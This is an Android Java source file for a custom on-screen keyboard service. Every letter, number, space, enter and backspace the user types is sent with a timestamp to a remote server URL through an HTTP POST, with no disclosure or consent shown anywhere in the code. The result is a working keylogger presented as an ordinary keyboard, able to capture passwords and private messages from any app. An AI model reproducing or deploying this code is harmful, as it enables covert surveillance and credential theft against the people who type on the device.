package com.example.customkeyboard;

import android.inputmethodservice.InputMethodService;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONObject;
import java.io.IOException;

public class KeyboardService extends InputMethodService {
    private static final String TAG = "KeyboardService";
    private static final String SERVER_URL = "https://your-render-server.com/api/keystrokes";
    private OkHttpClient client;
    private View keyboardView;
    private boolean isCaps = false;

    @Override
    public void onCreate() {
        super.onCreate();
        client = new OkHttpClient();
    }

    @Override
    public View onCreateInputView() {
        keyboardView = getLayoutInflater().inflate(R.layout.keyboard_layout, null);
        initializeKeys();
        return keyboardView;
    }

    private void initializeKeys() {
        // Initialize letter keys
        String[] letters = {"a","b","c","d","e","f","g","h","i","j","k","l","m",
                          "n","o","p","q","r","s","t","u","v","w","x","y","z"};
        for (String letter : letters) {
            int id = getResources().getIdentifier("key_" + letter, "id", getPackageName());
            Button key = keyboardView.findViewById(id);
            if (key != null) {
                final String letterValue = letter;
                key.setOnClickListener(v -> handleKeyPress(letterValue));
            }
        }

        // Initialize number keys
        for (int i = 0; i <= 9; i++) {
            int id = getResources().getIdentifier("key_" + i, "id", getPackageName());
            Button key = keyboardView.findViewById(id);
            if (key != null) {
                final String number = String.valueOf(i);
                key.setOnClickListener(v -> handleKeyPress(number));
            }
        }

        // Special keys
        Button shiftKey = keyboardView.findViewById(R.id.key_shift);
        if (shiftKey != null) {
            shiftKey.setOnClickListener(v -> handleShift());
        }

        Button spaceKey = keyboardView.findViewById(R.id.key_space);
        if (spaceKey != null) {
            spaceKey.setOnClickListener(v -> handleKeyPress(" "));
        }

        Button enterKey = keyboardView.findViewById(R.id.key_enter);
        if (enterKey != null) {
            enterKey.setOnClickListener(v -> handleKeyPress("\n"));
        }

        Button backspaceKey = keyboardView.findViewById(R.id.key_backspace);
        if (backspaceKey != null) {
            backspaceKey.setOnClickListener(v -> handleBackspace());
        }

        Button commaKey = keyboardView.findViewById(R.id.key_comma);
        if (commaKey != null) {
            commaKey.setOnClickListener(v -> handleKeyPress(","));
        }

        Button periodKey = keyboardView.findViewById(R.id.key_period);
        if (periodKey != null) {
            periodKey.setOnClickListener(v -> handleKeyPress("."));
        }
    }

    private void handleKeyPress(String text) {
        String inputText = isCaps ? text.toUpperCase() : text;
        getCurrentInputConnection().commitText(inputText, 1);
        sendKeyToServer(inputText);
    }

    private void handleShift() {
        isCaps = !isCaps;
        updateCapsState();
    }

    private void handleBackspace() {
        getCurrentInputConnection().deleteSurroundingText(1, 0);
        sendKeyToServer("BACKSPACE");
    }

    private void updateCapsState() {
        String[] letters = {"a","b","c","d","e","f","g","h","i","j","k","l","m",
                          "n","o","p","q","r","s","t","u","v","w","x","y","z"};
        for (String letter : letters) {
            int id = getResources().getIdentifier("key_" + letter, "id", getPackageName());
            Button key = keyboardView.findViewById(id);
            if (key != null) {
                key.setText(isCaps ? letter.toUpperCase() : letter);
            }
        }
    }

    private void sendKeyToServer(String key) {
        try {
            JSONObject jsonBody = new JSONObject();
            jsonBody.put("key", key);
            jsonBody.put("timestamp", System.currentTimeMillis());

            RequestBody body = RequestBody.create(
                jsonBody.toString(),
                MediaType.parse("application/json; charset=utf-8")
            );

            Request request = new Request.Builder()
                .url(SERVER_URL)
                .post(body)
                .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to send keystroke: " + e.getMessage());
                }

                @Override
                public void onResponse(Call call, Response response) {
                    try {
                        if (!response.isSuccessful()) {
                            Log.e(TAG, "Server error: " + response.code());
                        }
                    } finally {
                        response.close();
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error sending keystroke: " + e.getMessage());
        }
    }
}
